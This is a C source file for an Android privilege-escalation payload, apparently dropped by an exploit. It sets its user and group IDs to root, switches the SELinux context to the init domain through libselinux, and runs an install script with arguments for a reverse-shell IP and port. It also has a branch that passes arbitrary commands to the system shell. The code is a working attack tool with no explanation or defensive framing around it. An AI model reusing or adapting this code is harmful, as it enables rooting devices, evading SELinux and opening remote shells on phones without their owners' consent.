#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <dlfcn.h>
#include <fcntl.h>

static char *guid = "0A5AAF9EA22EDD8A65269121FE257AF1";

// #define DEBUG

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...)                                                  \
  {                                                                \
    __android_log_print(ANDROID_LOG_INFO, "run-as", __VA_ARGS__); \
    printf(__VA_ARGS__);                                           \
    printf("\n");                                                  \
    fflush(stdout);                                                \
  }
#else
#define LOGV(...)
#endif

// reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char **con);
typedef int setcon_t(const char *con);


static void check_flags(char **envp) {
  LOGV("[!] %s\n", guid);
  return;
}

#if 0
int main(int argc, char **argv, char **envp) {

  check_flags(envp);

  LOGV("[*] uid %s %d", argv[0], getuid());

  if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
    LOGV("[-] setresgid/setresuid failed");
  }

  LOGV("[*] uid %d\n", getuid());

  dlerror();
#ifdef __aarch64__
  void *selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void *selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux) {
    void *getcon = dlsym(selinux, "getcon");
    const char *error = dlerror();
    if (error) {
      LOGV("[-] dlsym error %s\n", error);
    } else {
      getcon_t *getcon_p = (getcon_t *)getcon;
      char *secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("[+] getcon = %s, ret = %d ", secontext, ret);
      void *setcon = dlsym(selinux, "setcon");
      const char *error = dlerror();
      if (error) {
        LOGV("[-] dlsym setcon error %s\n", error);
      } else {
        setcon_t *setcon_p = (setcon_t *)setcon;
        // ret = (*setcon_p)("u:r:shell:s0");
        ret = (*setcon_p)("u:r:init:s0");
        // ret = (*setcon_p)("u:r:debuggerd:s0");
        ret = (*getcon_p)(&secontext);
        LOGV("[+] setcon = %s, ret = %d\n", secontext, ret);
      }
    }
    dlclose(selinux);
  } else {
    LOGV("[-] no selinux?\n");
  }

  if (argc == 1) {
    char *argvs[] = {"/system/bin/sh", "/data/local/tmp/install.sh", NULL};
    execve("/system/bin/sh", argvs, envp);
  } else {
    char *argvs[] = {"/system/bin/sh", "-c", argv[1], NULL};
    LOGV("[+] run cmd = [/system/bin/sh -c %s]\n", argv[1]);
    execve("/system/bin/sh", argvs, envp);
  }
}
#else
static char *install_script_path = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
static char *work_dir = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
static char *rshell_ip = "255.255.255.255";
// static char *install_script_path = "/data/local/tmp/install.sh";
// static char *work_dir = "/data/local/tmp";
// static char *rshell_ip = "192.168.111.91";
static char *rshell_port = "22222";


int main(int argc, char **argv, char **envp) {

  check_flags(envp);

  LOGV("[*] uid %s %d", argv[0], getuid());

  if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
    LOGV("[-] setresgid/setresuid failed");
  }

  LOGV("[*] uid %d\n", getuid());

  dlerror();
#ifdef __aarch64__
  void *selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void *selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux) {
    void *getcon = dlsym(selinux, "getcon");
    const char *error = dlerror();
    if (error) {
      LOGV("[-] dlsym error %s\n", error);
    } else {
      getcon_t *getcon_p = (getcon_t *)getcon;
      char *secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("[+] getcon = %s, ret = %d ", secontext, ret);
      void *setcon = dlsym(selinux, "setcon");
      const char *error = dlerror();
      if (error) {
        LOGV("[-] dlsym setcon error %s\n", error);
      } else {
        setcon_t *setcon_p = (setcon_t *)setcon;
        // ret = (*setcon_p)("u:r:shell:s0");
        ret = (*setcon_p)("u:r:init:s0");
        // ret = (*setcon_p)("u:r:debuggerd:s0");
        ret = (*getcon_p)(&secontext);
        LOGV("[+] setcon = %s, ret = %d\n", secontext, ret);
      }
    }
    dlclose(selinux);
  } else {
    LOGV("[-] no selinux?\n");
  }

  if (argc == 1) {
    LOGV("[+] run cmd = [%s install.sh %s %s %s]\n", install_script_path, work_dir, rshell_ip, rshell_port);
    char *argvs[] = {"install.sh", work_dir, rshell_ip, rshell_port, NULL};
    execve(install_script_path, argvs, envp);
  } else {
    if(strstr(argv[1], "kill")) {
      char *argvs[] = {"/system/bin/sh", "-c", argv[1], NULL};
      LOGV("[+] run cmd = [/system/bin/sh -c %s]\n", argv[1]);
      execve("/system/bin/sh", argvs, envp);
    }
  }

  LOGV("[+] run cmd = [%s install.sh %s %s %s]\n", install_script_path, work_dir, rshell_ip, rshell_port);
  char *argvs[] = {"install.sh", work_dir, rshell_ip, rshell_port, NULL};
  execve(install_script_path, argvs, envp);

}
#endif
